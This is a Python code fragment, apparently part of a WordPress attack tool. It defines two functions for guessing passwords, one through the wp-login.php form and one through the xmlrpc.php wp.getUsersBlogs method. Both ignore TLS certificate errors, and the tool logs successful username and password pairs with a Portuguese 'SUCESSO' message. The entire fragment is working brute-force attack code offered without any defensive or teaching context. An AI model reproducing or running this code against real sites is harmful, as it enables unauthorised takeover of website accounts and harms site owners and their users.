def bf_login(base, user, pwd, results, log_func):
    s = requests.Session()
    try:
        r = s.get(base.rstrip("/") + "/wp-login.php", timeout=15, verify=False, allow_redirects=True)
        soup = BeautifulSoup(r.text, "html.parser")
        data = {
            "log": user, "pwd": pwd, "rememberme": "forever",
            "wp-submit": "Log In", "redirect_to": base + "/wp-admin/", "testcookie": "1"
        }
        for inp in soup.find_all("input"):
            n, v = inp.get("name"), inp.get("value")
            if n and n not in data and v:
                data[n] = v
        r2 = s.post(base.rstrip("/") + "/wp-login.php", data=data, timeout=15, verify=False, allow_redirects=True)
        if "wp-admin" in (r2.url or "") or "dashboard" in r2.text[:4000].lower():
            log_func(f"\n!!! SUCESSO: Usuario = {user:<15} Senha = {pwd}\n", "orange")
            results.append((user, pwd))
            return True
    except Exception:
        pass
    return False

def bf_xmlrpc(base, user, pwd):
    xml = f"""<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName>
<params><param><value>{user}</value></param><param><value>{pwd}</value></param></params></methodCall>"""
    try:
        r = requests.post(base.rstrip("/") + "/xmlrpc.php", data=xml, timeout=15, verify=False, headers=UA)
        if "200 OK" in r.text or "<name>blogid" in r.text.lower():
            return True
    except Exception:
        pass
    return False

